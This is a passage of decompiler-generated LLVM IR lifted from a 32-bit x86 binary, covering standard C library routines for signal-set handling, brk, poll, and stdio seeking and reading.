  br i1 %v2_804f8d2, label %dec_label_pc_804f8dc, label %dec_label_pc_804f8d6

dec_label_pc_804f8d6:                             ; preds = %dec_label_pc_804f89b
  %v3_804f8d6 = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_804f8df

dec_label_pc_804f8dc:                             ; preds = %dec_label_pc_804f89b, %dec_label_pc_804f884, %dec_label_pc_804f85b
  br label %dec_label_pc_804f8df

dec_label_pc_804f8df:                             ; preds = %dec_label_pc_804f8d6, %dec_label_pc_804f8dc
  %storemerge = phi i32 [ -1, %dec_label_pc_804f8dc ], [ %v3_804f8d6, %dec_label_pc_804f8d6 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804f838, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804f881, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 9, 1, 2, 3, 4, 6, 5, 0, 7, 8 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigaddset, { 3, 1, 0, 2 }
  uselistorder i32 160, { 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 0, 5 }
  uselistorder label %dec_label_pc_804f8df, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_804f8f6 = add i32 %arg2, -1
  %v1_804f8f9 = urem i32 %v1_804f8f6, 32
  %v2_804f8f9 = icmp eq i32 %v1_804f8f9, 0
  %v2_804f8fc = udiv i32 %v1_804f8f6, 32
  br i1 %v2_804f8f9, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_804f8ff = shl i32 1, %v1_804f8f9
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_804f901 = phi i32 [ 1, %entry ], [ %v5_804f8ff, %bb ]
  %v2_804f901 = mul nuw nsw i32 %v2_804f8fc, 4
  %v3_804f901 = add i32 %v2_804f901, %arg1
  %v4_804f901 = inttoptr i32 %v3_804f901 to i32*
  %v5_804f901 = load i32, i32* %v4_804f901, align 4
  %v7_804f901 = and i32 %v5_804f901, %v6_804f901
  %v8_804f901 = icmp eq i32 %v7_804f901, 0
  %v1_804f905 = icmp eq i1 %v8_804f901, false
  %v2_804f905 = zext i1 %v1_804f905 to i32
  ret i32 %v2_804f905

; uselistorder directives
  uselistorder i32 %v1_804f8f9, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804f90c = load i32, i32* @ebx, align 4
  store i32 %v0_804f90c, i32* %stack_var_-4, align 4
  %v1_804f91a = add i32 %arg2, -1
  %v1_804f91d = urem i32 %v1_804f91a, 32
  %v2_804f91d = icmp eq i32 %v1_804f91d, 0
  store i32 %v1_804f91d, i32* @ecx, align 4
  br i1 %v2_804f91d, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v5_804f920 = shl i32 1, %v1_804f91d
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_804f925 = phi i32 [ 1, %entry ], [ %v5_804f920, %bb ]
  %v2_804f922 = udiv i32 %v1_804f91a, 32
  store i32 %v2_804f922, i32* @edx, align 4
  %v2_804f925 = mul nuw nsw i32 %v2_804f922, 4
  %v3_804f925 = add i32 %v2_804f925, %arg1
  %v4_804f925 = inttoptr i32 %v3_804f925 to i32*
  %v5_804f925 = load i32, i32* %v4_804f925, align 4
  %v7_804f925 = or i32 %v5_804f925, %v6_804f925
  store i32 %v7_804f925, i32* %v4_804f925, align 4
  %v2_804f92a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f92a, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_804f922, { 1, 0 }
  uselistorder i32 %v1_804f91d, { 2, 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_804f93a = add i32 %arg2, -1
  %v1_804f93d = urem i32 %v1_804f93a, 32
  %v2_804f93d = icmp eq i32 %v1_804f93d, 0
  br i1 %v2_804f93d, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v4_804f940 = shl i32 -2, %v1_804f93d
  %v5_804f940 = sub nsw i32 32, %v1_804f93d
  %v6_804f940 = lshr i32 -2, %v5_804f940
  %v7_804f940 = or i32 %v6_804f940, %v4_804f940
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_804f945 = phi i32 [ -2, %entry ], [ %v7_804f940, %bb ]
  %v2_804f942 = udiv i32 %v1_804f93a, 32
  %v2_804f945 = mul nuw nsw i32 %v2_804f942, 4
  %v3_804f945 = add i32 %v2_804f945, %arg1
  %v4_804f945 = inttoptr i32 %v3_804f945 to i32*
  %v5_804f945 = load i32, i32* %v4_804f945, align 4
  %v7_804f945 = and i32 %v5_804f945, %v6_804f945
  store i32 %v7_804f945, i32* %v4_804f945, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_804f93d, { 1, 2, 0 }
  uselistorder i32 -2, { 3, 5, 4, 2, 6, 0, 15, 16, 1, 12, 14, 11, 13, 18, 7, 8, 9, 17, 10 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_804f94c = load i32, i32* @eax, align 4
  %v1_804f94c = add i32 %v0_804f94c, 28
  %v2_804f94c = inttoptr i32 %v1_804f94c to i32*
  %v3_804f94c = load i32, i32* %v2_804f94c, align 4
  store i32 %v3_804f94c, i32* @global_var_8056260.411, align 32
  %v1_804f955 = add i32 %v0_804f94c, 44
  %v2_804f955 = inttoptr i32 %v1_804f955 to i32*
  %v3_804f955 = load i32, i32* %v2_804f955, align 4
  store i32 %v3_804f955, i32* @global_var_8056264.412, align 4
  ret i32 %v3_804f955
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f960 = load i32, i32* @ebx, align 4
  store i32 %v0_804f960, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_804f973 = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_804f973, i32* @global_var_8055e04.388, align 4
  %v7_804f97e = icmp ult i32 %v1_804f973, %arg1
  %v1_804f980 = icmp eq i1 %v7_804f97e, false
  br i1 %v1_804f980, label %dec_label_pc_804f990, label %dec_label_pc_804f982

dec_label_pc_804f982:                             ; preds = %entry
  %v0_804f982 = load i32, i32* %stack_var_-4, align 4
  %v1_804f982 = call i32 @__errno_location(i32 %v0_804f982)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_804f98a = inttoptr i32 %v1_804f982 to i32*
  store i32 12, i32* %v1_804f98a, align 4
  %v0_804f991.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f990

dec_label_pc_804f990:                             ; preds = %entry, %dec_label_pc_804f982
  %v0_804f991 = phi i32 [ 0, %entry ], [ %v0_804f991.pre, %dec_label_pc_804f982 ]
  %v2_804f994 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f994, i32* @ebx, align 4
  ret i32 %v0_804f991

; uselistorder directives
  uselistorder i32 %v1_804f973, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_8055e04.388, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f990, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_804f99b = load i32, i32* @eax, align 4
  %v1_804f99d = sub i32 0, %v0_804f99b
  %v1_804f99f = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v2_804f9a4 = inttoptr i32 %v1_804f99f to i32*
  store i32 %v1_804f99d, i32* %v2_804f9a4, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 14, 15, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 29, 26, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46 }
}

define i32 @__libc_poll() local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804f9b0 = load i32, i32* @edi, align 4
  store i32 %v0_804f9b0, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_804f9c0 = load i32, i32* @ebx, align 4
  %v1_804f9c1 = inttoptr i32 %tmp4 to %pollfd*
  %v5_804f9c8 = call i32 @poll(%pollfd* %v1_804f9c1, i32 %tmp3, i32 %tmp)
  store i32 %v0_804f9c0, i32* @ebx, align 4
  store i32 %v5_804f9c8, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_804f9c8, -4095
  br i1 %tmp10, label %dec_label_pc_804f9e0, label %dec_label_pc_804f9d4

dec_label_pc_804f9d4:                             ; preds = %entry
  %v1_804f9d4 = call i32 @__errno_location(i32 %v0_804f9c0)
  %v0_804f9d9 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f9d9 = sub i32 0, %v0_804f9d9
  %v2_804f9db = inttoptr i32 %v1_804f9d4 to i32*
  store i32 %v1_804f9d9, i32* %v2_804f9db, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f9e0

dec_label_pc_804f9e0:                             ; preds = %entry, %dec_label_pc_804f9d4
  %v0_804f9e1 = phi i32 [ %v5_804f9c8, %entry ], [ -1, %dec_label_pc_804f9d4 ]
  %v2_804f9e4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f9e4, i32* @edi, align 4
  ret i32 %v0_804f9e1

; uselistorder directives
  uselistorder i32 %v5_804f9c8, { 1, 0, 2 }
  uselistorder i32 %v0_804f9c0, { 1, 0 }
  uselistorder label %dec_label_pc_804f9e0, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_804f9f3 = ashr i32 %arg2, 31
  %v4_804f9fa = inttoptr i32 %arg1 to i16*
  %v5_804f9fa = call i32 @__GI_fseeko64(i16* %v4_804f9fa, i32 %arg2, i32 %v1_804f9f3, i32 %arg3)
  ret i32 %v5_804f9fa
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_804fa04 = load i32, i32* @ebp, align 4
  %v0_804fa05 = load i32, i32* @edi, align 4
  %v0_804fa06 = load i32, i32* @esi, align 4
  %v0_804fa07 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_804fa17 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804fa17, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp = icmp ult i32 %arg4, 3
  br i1 %tmp, label %dec_label_pc_804fa3b, label %dec_label_pc_804fa28

dec_label_pc_804fa28:                             ; preds = %entry
  %v1_804fa28 = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_804fa28, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_804fa30 = inttoptr i32 %v1_804fa28 to i32*
  store i32 22, i32* %v1_804fa30, align 4
  br label %dec_label_pc_804fae1

dec_label_pc_804fa3b:                             ; preds = %entry
  %v1_804fa3b = add i32 %v4_804fa17, 52
  %v2_804fa3b = inttoptr i32 %v1_804fa3b to i32*
  %v3_804fa3b = load i32, i32* %v2_804fa3b, align 4
  %v1_804fa3e = icmp eq i32 %v3_804fa3b, 0
  %v1_804fa40 = icmp eq i1 %v1_804fa3e, false
  br i1 %v1_804fa40, label %dec_label_pc_804fa61, label %dec_label_pc_804fa42

dec_label_pc_804fa42:                             ; preds = %dec_label_pc_804fa3b
  %v1_804fa42 = add i32 %v4_804fa17, 56
  store i32 %v1_804fa42, i32* @ebx, align 4
  %v2_804fa4c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804fa4c, i32* @eax, align 4
  %v3_804fa51 = call i32 @__pthread_return_void(i32 %v2_804fa4c, i32 134535499)
  store i32 %v3_804fa51, i32* %eax.global-to-local, align 4
  %v0_804fa56 = load i32, i32* @ebx, align 4
  %v2_804fa59 = call i32 @__pthread_return_0(i32 %v0_804fa56)
  store i32 %v2_804fa59, i32* %eax.global-to-local, align 4
  %v0_804fa61.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804fa61

dec_label_pc_804fa61:                             ; preds = %dec_label_pc_804fa3b, %dec_label_pc_804fa42
  %v0_804fa69 = phi i32 [ %v4_804fa17, %dec_label_pc_804fa3b ], [ %v0_804fa61.pre, %dec_label_pc_804fa42 ]
  %v1_804fa61 = inttoptr i32 %v0_804fa69 to i8*
  %v2_804fa61 = load i8, i8* %v1_804fa61, align 1
  %v3_804fa61 = and i8 %v2_804fa61, 64
  %v4_804fa61 = icmp eq i8 %v3_804fa61, 0
  br i1 %v4_804fa61, label %dec_label_pc_804fa76, label %dec_label_pc_804fa66

dec_label_pc_804fa66:                             ; preds = %dec_label_pc_804fa61
  %v2_804fa6a = call i32 @__stdio_wcommit(i32 %v0_804fa69)
  store i32 %v2_804fa6a, i32* %eax.global-to-local, align 4
  %v1_804fa72 = icmp eq i32 %v2_804fa6a, 0
  %v1_804fa74 = icmp eq i1 %v1_804fa72, false
  br i1 %v1_804fa74, label %dec_label_pc_804fac9, label %dec_label_pc_804fa76

dec_label_pc_804fa76:                             ; preds = %dec_label_pc_804fa66, %dec_label_pc_804fa61
  %v0_804fa76 = load i32, i32* @edi, align 4
  %v9_804fa76 = icmp eq i32 %v0_804fa76, 1
  %v1_804fa79 = icmp eq i1 %v9_804fa76, false
  br i1 %v1_804fa79, label %dec_label_pc_804fa76.dec_label_pc_804fa8f_crit_edge, label %dec_label_pc_804fa7b

dec_label_pc_804fa76.dec_label_pc_804fa8f_crit_edge: ; preds = %dec_label_pc_804fa76
  %.pre6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_804fa8f

dec_label_pc_804fa7b:                             ; preds = %dec_label_pc_804fa76
  %v0_804fa7b = load i32, i32* @ecx, align 4
  %v2_804fa7d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804fa7d, i32* %eax.global-to-local, align 4
  %v0_804fa82 = load i32, i32* @esi, align 4
  %v5_804fa82 = inttoptr i32 %v0_804fa82 to i16*
  %v6_804fa83 = call i32 @__stdio_adjust_position(i16* %v5_804fa82, i32 %v2_804fa7d, i32 %v0_804fa7b, i32 %v0_804fa7b)
  store i32 %v6_804fa83, i32* %eax.global-to-local, align 4
  %v2_804fa8b = icmp slt i32 %v6_804fa83, 0
  br i1 %v2_804fa8b, label %dec_label_pc_804fac9, label %dec_label_pc_804fa7b.dec_label_pc_804fa8f_crit_edge

dec_label_pc_804fa7b.dec_label_pc_804fa8f_crit_edge: ; preds = %dec_label_pc_804fa7b
  %v0_804fa90.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804fa8f

dec_label_pc_804fa8f:                             ; preds = %dec_label_pc_804fa76.dec_label_pc_804fa8f_crit_edge, %dec_label_pc_804fa7b.dec_label_pc_804fa8f_crit_edge
  %v2_804fa91.pre-phi = phi i32 [ %.pre6, %dec_label_pc_804fa76.dec_label_pc_804fa8f_crit_edge ], [ %v2_804fa7d, %dec_label_pc_804fa7b.dec_label_pc_804fa8f_crit_edge ]
  %v0_804fa90 = phi i32 [ %v0_804fa76, %dec_label_pc_804fa76.dec_label_pc_804fa8f_crit_edge ], [ %v0_804fa90.pre, %dec_label_pc_804fa7b.dec_label_pc_804fa8f_crit_edge ]
  %v0_804fa8f = load i32, i32* @edx, align 4
  store i32 %v2_804fa91.pre-phi, i32* %eax.global-to-local, align 4
  %v0_804fa96 = load i32, i32* @esi, align 4
  %v5_804fa97 = inttoptr i32 %v2_804fa91.pre-phi to i32*
  %v6_804fa97 = call i32 @__stdio_seek(i32 %v0_804fa96, i32* %v5_804fa97, i32 %v0_804fa90, i32 %v0_804fa8f)
  store i32 %v6_804fa97, i32* %eax.global-to-local, align 4
  %v2_804fa9f = icmp slt i32 %v6_804fa97, 0
  br i1 %v2_804fa9f, label %dec_label_pc_804fac9, label %dec_label_pc_804faa3

dec_label_pc_804faa3:                             ; preds = %dec_label_pc_804fa8f
  %v0_804faa3 = load i32, i32* @esi, align 4
  %v1_804faa3 = inttoptr i32 %v0_804faa3 to i32*
  %v2_804faa3 = load i32, i32* %v1_804faa3, align 4
  store i32 %v2_804faa3, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804faa7 = add i32 %v0_804faa3, 44
  %v2_804faa7 = inttoptr i32 %v1_804faa7 to i32*
  store i32 0, i32* %v2_804faa7, align 4
  %v0_804faae = load i32, i32* @esi, align 4
  %v1_804faae = add i32 %v0_804faae, 2
  %v2_804faae = inttoptr i32 %v1_804faae to i8*
  store i8 0, i8* %v2_804faae, align 1
  %v0_804fab2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fab2 = and i32 %v0_804fab2, -72
  store i32 %v1_804fab2, i32* %eax.global-to-local, align 4
  %v1_804fab5 = trunc i32 %v1_804fab2 to i16
  %v2_804fab5 = load i32, i32* @esi, align 4
  %v3_804fab5 = inttoptr i32 %v2_804fab5 to i16*
  store i16 %v1_804fab5, i16* %v3_804fab5, align 2
  %v0_804fab8 = load i32, i32* @esi, align 4
  %v1_804fab8 = add i32 %v0_804fab8, 8
  %v2_804fab8 = inttoptr i32 %v1_804fab8 to i32*
  %v3_804fab8 = load i32, i32* %v2_804fab8, align 4
  store i32 %v3_804fab8, i32* %eax.global-to-local, align 4
  %v2_804fabb = add i32 %v0_804fab8, 16
  %v3_804fabb = inttoptr i32 %v2_804fabb to i32*
  store i32 %v3_804fab8, i32* %v3_804fabb, align 4
  %v0_804fabe = load i32, i32* %eax.global-to-local, align 4
  %v1_804fabe = load i32, i32* @esi, align 4
  %v2_804fabe = add i32 %v1_804fabe, 20
  %v3_804fabe = inttoptr i32 %v2_804fabe to i32*
  store i32 %v0_804fabe, i32* %v3_804fabe, align 4
  %v0_804fac1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fac1 = load i32, i32* @esi, align 4
  %v2_804fac1 = add i32 %v1_804fac1, 24
  %v3_804fac1 = inttoptr i32 %v2_804fac1 to i32*
  store i32 %v0_804fac1, i32* %v3_804fac1, align 4
  %v0_804fac4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fac4 = load i32, i32* @esi, align 4
  %v2_804fac4 = add i32 %v1_804fac4, 28
  %v3_804fac4 = inttoptr i32 %v2_804fac4 to i32*
  store i32 %v0_804fac4, i32* %v3_804fac4, align 4
  br label %dec_label_pc_804facc

dec_label_pc_804fac9:                             ; preds = %dec_label_pc_804fa8f, %dec_label_pc_804fa7b, %dec_label_pc_804fa66
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804facc

dec_label_pc_804facc:                             ; preds = %dec_label_pc_804faa3, %dec_label_pc_804fac9
  br i1 %v1_804fa40, label %dec_label_pc_804fae1, label %dec_label_pc_804fad0

dec_label_pc_804fad0:                             ; preds = %dec_label_pc_804facc
  %v2_804fad4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804fad4, i32* @eax, align 4
  %v3_804fad9 = call i32 @__pthread_return_void(i32 %v2_804fad4, i32 1)
  store i32 %v3_804fad9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fae1

dec_label_pc_804fae1:                             ; preds = %dec_label_pc_804facc, %dec_label_pc_804fa28, %dec_label_pc_804fad0
  %v0_804fae4 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804fae4, i32* %eax.global-to-local, align 4
  store i32 %v0_804fa07, i32* @ebx, align 4
  store i32 %v0_804fa06, i32* @esi, align 4
  store i32 %v0_804fa05, i32* @edi, align 4
  store i32 %v0_804fa04, i32* @ebp, align 4
  ret i32 %v0_804fae4

; uselistorder directives
  uselistorder i32 %v2_804fa91.pre-phi, { 1, 0 }
  uselistorder i32 %v0_804fa76, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 -72, { 1, 0 }
  uselistorder i8 64, { 4, 2, 3, 5, 0, 1 }
  uselistorder i32 (i32)* @__pthread_return_0, { 9, 19, 18, 17, 16, 15, 14, 13, 4, 31, 33, 32, 27, 3, 2, 1, 11, 30, 12, 10, 7, 6, 5, 23, 8, 29, 22, 28, 0, 21, 20, 26, 25, 24 }
  uselistorder i32 (i32, i32)* @__pthread_return_void, { 10, 9, 45, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 1, 0, 55, 54, 59, 58, 57, 56, 47, 46, 14, 13, 53, 52, 16, 15, 12, 11, 7, 6, 5, 4, 3, 2, 38, 37, 36, 8, 51, 50, 35, 34, 49, 48, 33, 32, 31, 30, 44, 43, 42, 41, 40, 39 }
  uselistorder i32 134535499, { 2, 3, 27, 28, 29, 30, 31, 32, 0, 4, 5, 6, 7, 8, 9, 10, 11, 12, 1, 20, 21, 22, 13, 23, 14, 15, 16, 17, 24, 25, 26, 18, 19 }
  uselistorder i32 52, { 13, 0, 10, 1, 2, 3, 4, 11, 12, 5, 8, 6, 14, 15, 9, 7 }
  uselistorder i32 22, { 8, 11, 12, 6, 0, 1, 2, 3, 7, 9, 10, 5, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fae1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804facc, { 1, 0 }
  uselistorder label %dec_label_pc_804fa8f, { 1, 0 }
  uselistorder label %dec_label_pc_804fa61, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804faec = load i32, i32* @ebx, align 4
  store i32 %v0_804faec, i32* %stack_var_-4, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v4_804faf2 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804faf2, i32* @ebx, align 4
  %v1_804fafa = bitcast i16* %arg1 to i8*
  %v2_804fafa = load i8, i8* %v1_804fafa, align 1
  %v3_804fafa = and i8 %v2_804fafa, 4
  %v4_804fafa = icmp eq i8 %v3_804fafa, 0
  %v1_804fafd = icmp eq i1 %v4_804fafa, false
  br i1 %v1_804fafd, label %dec_label_pc_804fb35, label %dec_label_pc_804faff

dec_label_pc_804faff:                             ; preds = %entry
  %v2_804faff = icmp slt i32 %arg3, 0
  %v3_804fb06 = select i1 %v2_804faff, i32 2147483647, i32 %arg3
  %v1_804fb0f = add i32 %v4_804faf2, 4
  %v2_804fb0f = inttoptr i32 %v1_804fb0f to i32*
  %v3_804fb0f = load i32, i32* %v2_804fb0f, align 4
  %v4_804fb12 = inttoptr i32 %arg2 to i32*
  %v5_804fb12 = call i32 @__libc_read(i32 %v3_804fb0f, i32* %v4_804fb12, i32 %v3_804fb06, i32 2147483647)
  store i32 %v5_804fb12, i32* %ecx.global-to-local, align 4
  %tmp12 = icmp slt i32 %v5_804fb12, 1
  %tmp13 = icmp eq i1 %tmp12, false
  br i1 %tmp13, label %dec_label_pc_804fb35, label %dec_label_pc_804fb21

dec_label_pc_804fb21:                             ; preds = %dec_label_pc_804faff
  %v1_804fb1a = icmp eq i32 %v5_804fb12, 0
  %v4_804fb1f = icmp eq i1 %v1_804fb1a, false
  %v0_804fb21 = load i32, i32* @ebx, align 4
  %v1_804fb21 = inttoptr i32 %v0_804fb21 to i32*
  %v2_804fb21 = load i32, i32* %v1_804fb21, align 4
  br i1 %v4_804fb1f, label %dec_label_pc_804fb2d, label %dec_label_pc_804fb25

dec_label_pc_804fb25:                             ; preds = %dec_label_pc_804fb21
  %v1_804fb25 = or i32 %v2_804fb21, 4
  %v1_804fb28 = trunc i32 %v1_804fb25 to i16
  %v3_804fb28 = inttoptr i32 %v0_804fb21 to i16*
  store i16 %v1_804fb28, i16* %v3_804fb28, align 2
  br label %dec_label_pc_804fb35

dec_label_pc_804fb2d:                             ; preds = %dec_label_pc_804fb21
  %v1_804fb2d = or i32 %v2_804fb21, 8
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_804fb32 = trunc i32 %v1_804fb2d to i16
  %v3_804fb32 = inttoptr i32 %v0_804fb21 to i16*
  store i16 %v1_804fb32, i16* %v3_804fb32, align 2
  br label %dec_label_pc_804fb35

dec_label_pc_804fb35:                             ; preds = %dec_label_pc_804faff, %entry, %dec_label_pc_804fb25, %dec_label_pc_804fb2d
  %v0_804fb36 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804fb39 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fb39, i32* @ebx, align 4
  ret i32 %v0_804fb36

; uselistorder directives
  uselistorder i32 %v5_804fb12, { 2, 0, 1 }
  uselistorder i32* %ecx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 2147483647, { 0, 3, 1, 2, 4 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fb35, { 3, 2, 0, 1 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v4_804fb44 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804fb44, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_804fb4c = load i16, i16* %arg1, align 2
  %v3_804fb4c = zext i16 %v2_804fb4c to i32
  store i32 %v3_804fb4c, i32* %ecx.global-to-local, align 4
  %tmp = urem i16 %v2_804fb4c, 4
  %v1_804fb51 = zext i16 %tmp to i32
  %v2_804fb51 = icmp eq i16 %tmp, 0
  br i1 %v2_804fb51, label %dec_label_pc_804fb80, label %dec_label_pc_804fb56

dec_label_pc_804fb56:                             ; preds = %entry
  %v1_804fb58 = add nsw i32 %v1_804fb51, -1
  %v8_804fb58 = icmp eq i32 %v1_804fb58, 0
  store i32 %v1_804fb58, i32* @edx, align 4
  br i1 %v8_804fb58, label %dec_label_pc_804fb80, label %dec_label_pc_804fb5b

dec_label_pc_804fb5b:                             ; preds = %dec_label_pc_804fb56
  %v3_804fb5b = and i32 %v3_804fb4c, 2048
  %v4_804fb5b = icmp eq i32 %v3_804fb5b, 0
  br i1 %v4_804fb5b, label %dec_label_pc_804fb80, label %dec_label_pc_804fb60

dec_label_pc_804fb60:                             ; preds = %dec_label_pc_804fb5b
  %v6_804fb60 = sub nsw i32 1, %v1_804fb51
  %v7_804fb60 = and i32 %v1_804fb58, %v6_804fb60
  %v8_804fb60 = icmp slt i32 %v7_804fb60, 0
  %v9_804fb60 = icmp eq i16 %tmp, 2
  %v10_804fb60 = icmp ult i16 %tmp, 2
  %v3_804fb63 = icmp eq i1 %v10_804fb60, %v8_804fb60
  %v4_804fb63 = icmp eq i1 %v9_804fb60, false
  %v5_804fb63 = and i1 %v4_804fb63, %v3_804fb63
  br i1 %v5_804fb63, label %dec_label_pc_804fbd4, label %dec_label_pc_804fb65

dec_label_pc_804fb65:                             ; preds = %dec_label_pc_804fb60
  %v1_804fb65 = add i32 %v4_804fb44, 40
  %v2_804fb65 = inttoptr i32 %v1_804fb65 to i32*
  %v3_804fb65 = load i32, i32* %v2_804fb65, align 4
  %v4_804fb65 = icmp eq i32 %v3_804fb65, 0
  %v1_804fb69 = icmp eq i1 %v4_804fb65, false
  br i1 %v1_804fb69, label %dec_label_pc_804fbd4, label %dec_label_pc_804fb6b

dec_label_pc_804fb6b:                             ; preds = %dec_label_pc_804fb65
  %v1_804fb6b = add i32 %v4_804fb44, 3
  %v2_804fb6b = inttoptr i32 %v1_804fb6b to i8*
  %v3_804fb6b = load i8, i8* %v2_804fb6b, align 1
  %v4_804fb6b = zext i8 %v3_804fb6b to i32
  %v2_804fb6f = sub nsw i32 %v1_804fb58, %v4_804fb6b
  %v1_804fb71 = add i32 %v4_804fb44, 44
  %v2_804fb71 = inttoptr i32 %v1_804fb71 to i32*
  %v3_804fb71 = load i32, i32* %v2_804fb71, align 4
  %v1_804fb75 = add nsw i32 %v2_804fb6f, -1
  %tmp12 = icmp slt i32 %v3_804fb71, 1
  br i1 %tmp12, label %dec_label_pc_804fb80, label %dec_label_pc_804fb7a

dec_label_pc_804fb7a:                             ; preds = %dec_label_pc_804fb6b
  %v1_804fb7a = add i32 %v4_804fb44, 2
